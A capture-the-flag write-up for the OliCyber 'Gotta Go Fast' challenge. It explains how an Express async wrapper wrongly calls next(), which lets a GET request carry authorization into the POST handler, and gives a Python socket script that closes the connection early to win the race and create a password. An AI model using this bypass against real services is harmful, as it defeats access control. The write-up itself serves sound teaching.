#nodejs #misc 
# m0le23 - Gotta Go Fast
## Description
Check out my new security proxy
Site: http://gottagofast.challs.olicyber.it
## Overview
The source code reveals that there is only the endpoint `/service` available:
- POST `/service?newPassword=` lets create a password (20 chars min), but only if **authorized**
- GET `/service?password=` checks if the password exists, if not returns `INVALID PASSWORD`
- DELETE `/service?password=` deletes the password
## Road to flag
It's not clear where the flag is, but I presume the app returns it if we are able to create a valid password.
In order to do so we have to get authorization in some way.
## Code review

The app is really simple:
```js
const httpRequest = async (method, req, res) => {
  if (res.locals.authorized) {
    return await (
      await fetch(SERVICE_URL + req.originalUrl, {
        method,
      })
    ).text();
  } else {
    return 'NOT AUTHORIZED';
  }
};
// Example: GET /service?password=MY_PASSWORD (using a valid password)
app.get(
  '/service',
  expressAsyncWrapper(async (req, res) => {
    res.locals.authorized = true; // Is a GET request
    const response = await httpRequest('GET', req, res);
    res.json(response);
  })
);
// Example: POST /service?newPassword=MY_PASSWORD (to add a password, min 20 chars)
// Example: DELETE /service?password=MY_PASSWORD (to delete a password)
app.use(  '/service',
  expressAsyncWrapper(async (req, res) => {
    // POST and DELETE require a valid token
    if (req.query.password === TOKEN)   res.locals.authorized = true;
    const method = req.method === 'DELETE' ? 'DELETE' : 'POST'; // Default to POST
    const response = await httpRequest(method, req, res);
    res.json(response);
  })
);
```

`expressAsyncWrapper` is defined as follows:
```js
export default (fn) => (req, res, next) => {
  (async () => {
    try {
      let nextCalled = false;
      const n = (err) => {
        nextCalled = true;
        next(err);
      };
      await fn(req, res, n);
      if (!nextCalled && !res.headersSent) n();
    } catch (error) {
      next(error);
    }
  })();
};
```

The bug is in the middleware: by calling `n()`, the request proceeds to the next middleware even when no error has occurred.
So by requesting `GET /service`, `res.locals.authorized` will be set to `true`; then the request proceeds to the next middleware (`app.use(  '/service',`) bypassing the access control because this code will be useless `if (req.query.password === TOKEN)   res.locals.authorized = true;` as `res.locals.authorized` is already `true`.

But how could this statement `if (!nextCalled && !res.headersSent) n();` be evaluated to true? Or better, how can I enter the race window when `res.headersSent` hasn't been set?

## Exploit

Solution: close the connection just before the headers are sent:
```python
import socket
import requests
import secrets
import time

psw = secrets.token_hex(20)
host = "gottagofast.challs.olicyber.it"
port = 80

request = f"""GET /service?newPassword={psw} HTTP/1.1
Host: {host}
Connection: keep-alive

"""
# exploit race condition
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host, port))
sock.sendall(request.encode())
time.sleep(0.1)
sock.close()
print("[+] sock closed")
# get the flag
r = requests.get(f"http://{host}:{port}/service?password={psw}")
print(r.text)
```